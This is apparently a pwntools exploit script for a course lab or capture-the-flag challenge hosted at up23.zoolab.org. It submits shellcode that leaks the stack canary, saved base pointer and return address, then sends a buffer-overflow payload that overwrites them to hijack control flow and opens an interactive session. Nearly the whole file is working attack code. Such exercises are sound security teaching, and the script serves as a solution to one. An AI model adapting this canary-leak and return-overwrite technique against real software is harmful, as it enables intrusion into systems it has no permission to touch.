#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];
payload = None

shellcode_asm = '''
push rbp
mov rbp, rsp
sub rsp, 0x20
mov QWORD PTR [rbp-0x18], rdi
mov rax, 0x8787878787878787
mov QWORD PTR [rbp-0x10], rax
lea rax, [rbp-0x8]
mov rax, QWORD PTR [rax]
mov rdx, QWORD PTR [rbp-0x18]
mov rsi, rax
lea rdi, [rip+0xe65]
mov eax, 0x0
call rdx
lea rax, [rbp]
add rax, 0x10
mov rax, QWORD PTR [rax]
mov rdx, QWORD PTR [rbp-0x18]
mov rsi, rax
lea rdi, [rip+0xe4f]
mov eax, 0x0
call rdx
'''

payload  = asm(shellcode_asm, arch='amd64')
print('shellcode : ',payload )

if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()
# print("payload=",payload)
# r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)
else:
    r.sendlineafter(b'send to me? ', b'0')

print(r.readline(0))
result_bytes = r.readline(0).split(b'->')[1]
canary=p64(int(result_bytes,16))
print("canary = ",canary)

result_bytes = r.readline(0).split(b'->')[1]
rbp=p64(int(result_bytes,16))
print("rbp = ",rbp)

result_bytes = r.readline(0).split(b'->')[1]
ret=p64(int(result_bytes,16)+171)
print("ret = ",ret)

payload=b'0' + b' ' * 23
# payload+=0xdeadbeef
payload+=canary
payload+=rbp
payload+=ret
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)

r.sendafter(b'Show me your answer? ',payload)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
